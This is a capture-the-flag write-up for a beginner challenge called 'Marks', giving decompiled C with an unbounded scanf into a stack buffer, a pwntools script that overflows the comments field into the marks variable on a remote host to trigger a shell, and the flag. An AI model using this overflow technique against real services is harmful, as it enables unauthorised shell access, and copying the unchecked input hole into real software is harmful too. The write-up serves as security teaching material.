# Beginner/Marks

Score 100/100 to pass this exam

Attachments: [marks.zip](./marks.zip)

nc 34.70.212.151 8004

## Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char v5[32]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v6; // [rsp+20h] [rbp-50h] BYREF
  __int64 v7; // [rsp+60h] [rbp-10h] BYREF
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = time(0LL);
  srand(v3);
  puts("Enter your details to view your marks ...");
  printf("Roll Number : ");
  __isoc99_scanf("%d", &v7);
  printf("Name : ");
  __isoc99_scanf("%s", v5);
  puts("Please Wait ...\n");
  usleep(0xF4240u);
  HIDWORD(v7) = rand() % 75;
  printf("You got %d marks out of 100\n", HIDWORD(v7));
  puts("Any Comments ?");
  __isoc99_scanf("%s", &v6);
  puts("Thanks !");
  if ( HIDWORD(v7) == 100 )
  {
    puts("Cool ! Here is your shell !");
    system("/bin/sh");
  }
  else
  {
    puts("Next time get 100/100 marks for shell :)");
  }
  return 0;
}
```

Use `v6` to overwrite `v7`.

```python
from pwn import *

context.log_level = 'debug'

# p = process('./chal')
p = remote('34.70.212.151', 8004)

p.sendlineafter(b':', b'100')
p.sendlineafter(b':', b'A'*0x8)
p.sendlineafter(b'?', b'A'*0x44+p32(100))

p.interactive()
```

## Flag

```plaintext
flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}
```

